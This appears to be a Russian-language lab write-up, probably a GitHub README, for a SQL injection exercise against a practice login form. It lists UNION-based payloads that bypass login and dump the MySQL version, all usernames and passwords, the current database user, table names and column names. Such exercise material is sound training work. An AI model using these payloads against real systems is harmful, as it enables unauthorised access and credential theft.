1. Список всех пользователей.
Инъекция: ' OR 1=1 #

![image](https://github.com/user-attachments/assets/be500567-e423-4c57-a012-9e362812fae5)

3. Узнать версию MySQL
Инъекция: ' UNION SELECT @@version, @@version # (ввод в поле пароля, user - james_kirk)

![image](https://github.com/user-attachments/assets/bc405aac-a85a-4cd3-8778-c3b4afcace6e)

4. Узнать пароли всех пользователей
Инъекция: ' UNION SELECT username,password FROM users;

![image](https://github.com/user-attachments/assets/523a0a88-3c0a-4652-b164-69b7ee49dc81)

5. Определить текущего пользователя базы данных
Инъекция: ' UNION SELECT CURRENT_USER(), CURRENT_USER() # (ввод в поле пароля, user - james_kirk)

![image](https://github.com/user-attachments/assets/2efacd00-cf7a-4dff-a4f6-a5287892a37c)

6. Извлечь имена таблиц из схемы базы данных
Инъекция: ' UNION SELECT table_name, table_name FROM information_schema.tables # (ввод в поле пароля, user - james_kirk)

![image](https://github.com/user-attachments/assets/533bd8a5-0105-4ad5-915e-7025aa41ce72)
![image](https://github.com/user-attachments/assets/38ba41ae-c7ba-4d29-a056-366be66cab1f)
![image](https://github.com/user-attachments/assets/105942ec-4130-4701-9c66-9cd26fbb830c)
![image](https://github.com/user-attachments/assets/8868d9d0-0a3b-438a-a764-d198915ae0e2)
![image](https://github.com/user-attachments/assets/9c44a0a9-7192-4999-9340-e975ec2390d2)

7. Получить список столбцов users таблицы
Инъекция: ' UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_name = 'users' # (ввод в поле пароля, user - james_kirk)

![image](https://github.com/user-attachments/assets/c32f533a-1d87-4bd1-9c6b-e14e20d861ed)

